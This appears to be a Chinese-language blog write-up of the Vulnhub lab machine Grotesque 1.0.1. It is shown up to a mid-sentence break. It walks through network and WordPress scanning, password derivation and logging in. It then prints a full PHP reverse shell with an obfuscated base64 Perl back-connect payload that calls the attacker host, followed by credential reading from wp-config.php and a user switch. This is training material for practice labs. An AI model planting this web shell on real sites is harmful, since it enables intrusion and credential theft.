<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>console-demo/posts/grotesque_vh-1.0.1/</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><link rel=stylesheet href=http://localhost:1313/hugo-theme-console/css/terminal-0.7.2.min.css><link rel=stylesheet href=http://localhost:1313/hugo-theme-console/css/animate-4.1.1.min.css><link rel=stylesheet href=http://localhost:1313/hugo-theme-console/css/console.css><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><meta property="og:title" content="Grotesque_vh 1.0.1"><meta property="og:description" content="Vulnhub靶机"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/grotesque_vh-1.0.1/"><meta property="article:published_time" content="2023-10-06T00:00:00+00:00"><meta name=twitter:title content="Grotesque_vh 1.0.1"><meta name=twitter:description content="Vulnhub靶机"></head><body class=terminal><div class=container><div class=terminal-nav><header class=terminal-logo><div class="logo terminal-prompt"><a href=http://localhost:1313/ class=no-style>console-demo</a>:~#
<a href=http://localhost:1313/posts>posts</a>/<a href=http://localhost:1313/posts/grotesque_vh-1.0.1>grotesque_vh-1.0.1</a>/</div></header><nav class=terminal-menu><ul vocab="https://schema.org/" typeof="BreadcrumbList"><li><a href=http://localhost:1313/about/ typeof="ListItem">about/</a></li><li><a href=http://localhost:1313/posts/ typeof="ListItem">archive/</a></li><li><a href=http://localhost:1313/photos/ typeof="ListItem">photos/</a></li></ul></nav></div></div><div class="container animated zoomIn fast"><h1>Grotesque_vh 1.0.1</h1>Oct. 6, 2023<br><br><h3 id=一信息收集>一、信息收集</h3><h4 id=1-使用-arp-scan-找到靶机>1 使用 arp-scan 找到靶机</h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>arp-scan --interface eth0 10.9.23.0/24
</span></span></code></pre></div><pre tabindex=0><code>┌──(root㉿kali)-[~]
└─# arp-scan --interface eth0 10.9.23.0/24
Interface: eth0, type: EN10MB, MAC: 00:0c:29:0a:50:19, IPv4: 10.9.23.111
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.9.23.1       50:6f:77:89:ad:99       HUAWEI TECHNOLOGIES CO.,LTD
10.9.23.10      68:da:73:a9:5c:57       (Unknown)
……
10.9.23.155     08:00:27:9c:83:dc       PCS Systemtechnik GmbH
……
10.9.23.233     7c:57:58:67:3c:15       HP Inc.
10.9.23.235     90:2e:16:a8:b9:1c       LCFC(HeFei) Electronics Technology co., ltd
10.9.23.238     00:2b:67:39:76:66       LCFC(HeFei) Electronics Technology co., ltd

35 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.052 seconds (124.76 hosts/sec). 34 responded
</code></pre><p>找到靶机：10.9.23.155 08:00:27:9c:83:dc <strong>PCS Systemtechnik GmbH</strong></p><h4 id=2-使用-nmap-对其进行详细扫描>2 使用 nmap 对其进行详细扫描</h4><pre tabindex=0><code>┌──(root㉿kali)-[~]
└─# nmap -A -sV -p- 10.9.23.155 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 19:52 CST
Nmap scan report for localhost (10.9.23.155)
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
66/tcp open  http    WEBrick httpd 1.4.2 (Ruby 2.5.5 (2019-03-15))
|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
|_http-server-header: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
80/tcp open  http    Apache httpd 2.4.38
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: 127.0.1.1

TRACEROUTE
HOP RTT     ADDRESS
1   1.23 ms localhost (10.9.23.155)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.20 seconds
</code></pre><h4 id=3-访问靶机网站>3 访问靶机网站</h4><p>80端口</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116200028.png alt=image.png></p><p>66端口</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116200013.png alt=image.png></p><p>最终在66端口下的网页中，我们可以点击<code>here</code>下载到一个压缩包
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116200929.png alt=image.png></p><p>解压后，在<code>\vvmlist\vvmlist.github.io\_vvmlist</code>文件夹中找到一个文件<code>sense.md</code>，在该文件中可以发现有用的信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116201121.png alt=image.png></p><p>提示我们可以访问<code>http://10.9.23.155/lyricsblog/</code>
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116201640.png alt=image.png></p><h4 id=4-web扫描>4 web扫描</h4><p>使用dirb、gobuster对<code>http://10.9.23.155:66</code>和<code>http://10.9.23.155/lyricsblog/</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#dirb</span>
</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# dirb http://10.9.23.155:66
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>DIRB v2.22    
</span></span><span style=display:flex><span>By The Dark Raver
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>START_TIME: Tue Jan <span style=color:#ae81ff>16</span> 20:34:05 <span style=color:#ae81ff>2024</span>
</span></span><span style=display:flex><span>URL_BASE: http://10.9.23.155:66/
</span></span><span style=display:flex><span>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GENERATED WORDS: <span style=color:#ae81ff>4612</span>                                                          
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---- Scanning URL: http://10.9.23.155:66/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.9.23.155:66/assets/                                                                                    
</span></span><span style=display:flex><span><span style=color:#f92672>==</span>&gt; DIRECTORY: http://10.9.23.155:66/functions/                                                                                 
</span></span><span style=display:flex><span>+ http://10.9.23.155:66/index <span style=color:#f92672>(</span>CODE:200|SIZE:1060253<span style=color:#f92672>)</span>                                                                           
</span></span><span style=display:flex><span>+ http://10.9.23.155:66/index.html <span style=color:#f92672>(</span>CODE:200|SIZE:1060253<span style=color:#f92672>)</span>                                                                      
</span></span><span style=display:flex><span>+ http://10.9.23.155:66/LICENSE <span style=color:#f92672>(</span>CODE:200|SIZE:35149<span style=color:#f92672>)</span>                                                                             
</span></span><span style=display:flex><span>---- Entering directory: http://10.9.23.155:66/assets/ ----
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>!<span style=color:#f92672>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>Use mode <span style=color:#e6db74>&#39;-w&#39;</span> <span style=color:#66d9ef>if</span> you want to scan it anyway<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>---- Entering directory: http://10.9.23.155:66/functions/ ----
</span></span><span style=display:flex><span>+ http://10.9.23.155:66/functions/index <span style=color:#f92672>(</span>CODE:200|SIZE:6442<span style=color:#f92672>)</span>                                                                    
</span></span><span style=display:flex><span>+ http://10.9.23.155:66/functions/index.html <span style=color:#f92672>(</span>CODE:200|SIZE:6442<span style=color:#f92672>)</span>                
</span></span><span style=display:flex><span>-----------------
</span></span><span style=display:flex><span>END_TIME: Tue Jan <span style=color:#ae81ff>16</span> 20:38:16 <span style=color:#ae81ff>2024</span>
</span></span><span style=display:flex><span>DOWNLOADED: <span style=color:#ae81ff>9224</span> - FOUND: <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#gobuster</span>
</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# gobuster dir -u http://10.9.23.155/lyricsblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh   
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.6
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.9.23.155/lyricsblog/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.6
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php,html,txt,sh
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/.php                 <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.html                <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index.php            <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.155/lyricsblog/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-content           <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 326<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-content/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-login.php         <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 5731<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/license.txt          <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 19915<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-includes          <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 327<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-includes/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/readme.html          <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 7399<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-trackback.php     <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 135<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-admin             <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 324<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-admin/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/xmlrpc.php           <span style=color:#f92672>(</span>Status: 405<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 42<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.html                <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/.php                 <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 276<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/wp-signup.php        <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-login.php?action<span style=color:#f92672>=</span>register<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Progress: <span style=color:#ae81ff>1102800</span> / <span style=color:#ae81ff>1102805</span> <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>没有扫描到什么关键有用的信息</p><p>从之前收集的信息可知这是个基于wordpress框架搭建的网站，所以我们可以再用<code>wpscan</code>工具扫一下[[3008-信息收集工具#^abbda8]]</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#基本扫描</span>
</span></span><span style=display:flex><span>wpscan --url http://10.9.23.155/lyricsblog/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#漏洞扫描</span>
</span></span><span style=display:flex><span>wpscan --url http://10.9.23.155/lyricsblog/ --enumerate vp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#用户枚举</span>
</span></span><span style=display:flex><span>wpscan --url http://10.9.23.155/lyricsblog/ --enumerate u
</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116202849.png alt=image.png>
发现一个用户<code>erdalkomurcu</code>，接下来我们去找密码</p><h4 id=5-密码破解>5 密码破解</h4><p>最后根据wordpress登录页面的提示
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116212137.png alt=image.png></p><p>在<code>http://10.9.23.155/lyricsblog/</code>网页中找到了，密码为计算下图歌词MD5的值
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116205438.png alt=image.png></p><p>Kali中生成一个文件，将歌词复制进去，再使用md5sum计算MD5的值</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# vim token.txt 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# cat token.txt 
</span></span><span style=display:flex><span>Çaresiz derdimin sebebi belli
</span></span><span style=display:flex><span>Dermanı yaramda arama doktor
</span></span><span style=display:flex><span>Şifa bulmaz gönlüm senin elinden
</span></span><span style=display:flex><span>Boşuna benimle uğraşma doktor
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Aşk yarasıdır bu ilaç kapatmaz
</span></span><span style=display:flex><span>Derdin teselli beni avutmaz
</span></span><span style=display:flex><span>Dermanı yardadır sende bulunmaz
</span></span><span style=display:flex><span>Boşuna benimle uğraşma doktor
</span></span><span style=display:flex><span>Dokunma benim gönül yarama
</span></span><span style=display:flex><span>Dokunma doktor
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Bedenimde değil kalbimde derdim
</span></span><span style=display:flex><span>Tek alışkanlığım bir zalim sevdim
</span></span><span style=display:flex><span>Sen çekil yanımdan sevdiğim gelsin
</span></span><span style=display:flex><span>Boşuna zamanı harcama doktor
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>root㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─# md5sum token.txt 
</span></span><span style=display:flex><span>bc78c6ab38e114d6135409e44f7cdda2  token.txt
</span></span></code></pre></div><p>同时在wordpress登录页<code>http://IP/lyricsblog/wp-login.php</code>的左上角发现密码大写提示
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116212819.png alt=image.png></p><p>使用账号密码登录</p><pre tabindex=0><code>账号:erdalkomurcu
密码:BC78C6AB38E114D6135409E44F7CDDA2
</code></pre><p>登录成功
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116213237.png alt=image.png></p><h3 id=二wordpress漏洞利用>二、wordpress漏洞利用</h3><p>根据之前打过的靶机[[2001-Lazysysadmin]]可知，wordpress中存在反弹shell漏洞</p><p>随便找一个PHP页面写入反弹shell
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116222655.png alt=image.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>which</span>($pr) {
</span></span><span style=display:flex><span>	$path <span style=color:#f92672>=</span> <span style=color:#a6e22e>execute</span>(<span style=color:#e6db74>&#34;which </span><span style=color:#e6db74>$pr</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> ($path <span style=color:#f92672>?</span> $path <span style=color:#f92672>:</span> $pr);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>execute</span>($cfe) {
</span></span><span style=display:flex><span>	$res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> ($cfe) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;exec&#39;</span>)) {
</span></span><span style=display:flex><span>			<span style=color:#f92672>@</span><span style=color:#a6e22e>exec</span>($cfe,$res);
</span></span><span style=display:flex><span>			$res <span style=color:#f92672>=</span> <span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,$res);
</span></span><span style=display:flex><span>			} 
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>elseif</span>(<span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;shell_exec&#39;</span>)) {
</span></span><span style=display:flex><span>			$res <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>shell_exec</span>($cfe);
</span></span><span style=display:flex><span>			} <span style=color:#66d9ef>elseif</span>(<span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;system&#39;</span>)) {
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>ob_start</span>();
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>system</span>($cfe);
</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>ob_get_contents</span>();
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>ob_end_clean</span>();
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>elseif</span>(<span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;passthru&#39;</span>)) {
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>ob_start</span>();
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>passthru</span>($cfe);
</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>ob_get_contents</span>();
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>ob_end_clean</span>();
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>elseif</span>(<span style=color:#f92672>@</span><span style=color:#a6e22e>is_resource</span>($f <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>popen</span>($cfe,<span style=color:#e6db74>&#34;r&#34;</span>))) {
</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span>(<span style=color:#f92672>!@</span><span style=color:#a6e22e>feof</span>($f)) {
</span></span><span style=display:flex><span>$res <span style=color:#f92672>.=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>fread</span>($f,<span style=color:#ae81ff>1024</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>pclose</span>($f);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> $res;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>cf</span>($fname,$text){
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($fp<span style=color:#f92672>=@</span><span style=color:#a6e22e>fopen</span>($fname,<span style=color:#e6db74>&#39;w&#39;</span>)) {
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>fputs</span>($fp,<span style=color:#f92672>@</span><span style=color:#a6e22e>base64_decode</span>($text));
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>fclose</span>($fp);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$yourip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10.9.23.111&#34;</span>; <span style=color:#75715e>#kali的IP地址
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$yourport <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;4444&#39;</span>; <span style=color:#75715e>#nc监听端口
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$usedb <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;perl&#39;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#39;perl&#39;</span>,<span style=color:#e6db74>&#39;c&#39;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#39;c&#39;</span>);
</span></span><span style=display:flex><span>$back_connect<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&#34;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&#34;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&#34;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&#34;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&#34;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&#34;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>cf</span>(<span style=color:#e6db74>&#39;/tmp/.bc&#39;</span>,$back_connect);
</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> <span style=color:#a6e22e>execute</span>(<span style=color:#a6e22e>which</span>(<span style=color:#e6db74>&#39;perl&#39;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#34; /tmp/.bc </span><span style=color:#e6db74>$yourip</span><span style=color:#e6db74> </span><span style=color:#e6db74>$yourport</span><span style=color:#e6db74> &amp;&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010> 
</span></span></span></code></pre></div><p>保存后现在kali中使用nc监听端口，然后浏览器访问写入反弹shell的页面</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvvp <span style=color:#ae81ff>4444</span>
</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223005.png alt=image.png></p><p>反弹进入后可以使用<code>python -c "import pty;pty.spawn('/bin/bash')"</code> 获取伪终端</p><h3 id=三提权>三、提权</h3><p>进来后，先随便找找文件</p><p>在<code>/var/www/html/lyricsblog/</code>目录下，发现wordpress配置文件<code>wp-config.php</code>中有账号和密码
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223802.png alt=image.png></p><p>使用<code>cat /etc/passwd</code>命令发现包含<code>raphael</code>用户
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223929.png alt=image.png></p><p>尝试登录<code>raphael</code>用户</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@grotesque:/var/www/html/lyricsblog$ su raphael
</span></span><span style=display:flex><span>su raphael
</span></span><span style=display:flex><span>Password: _double_trouble_
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>raphael@grotesque:/var/www/html/lyricsblog$ cd /
</span></span><span style=display:flex><span>cd /
</span></span><span style=display:flex><span>raphael@grotesque:/$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>raphael<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>raphael<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>raphael<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>raphael@grotesque:/$ uname -a
</span></span><span style=display:flex><span>uname -a
</span></span><span style=display:flex><span>Linux grotesque 4.19.0-13-amd64 <span style=color:#75715e>#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux</span>
</span></span><span style=display:flex><span>raphael@grotesque:/$ sudo -l
</span></span><span style=display:flex><span>sudo -l
</span></span><span style=display:flex><span>bash: sudo: command not found
</span></span><span style=display:flex><span>raphael@grotesque:/$
</span></span></code></pre></div><p>登录成功，查看系统内核信息和用户权限，发现无法通过这两项提权</p><p>那就先拿个flag，在<code>/home/raphael</code>
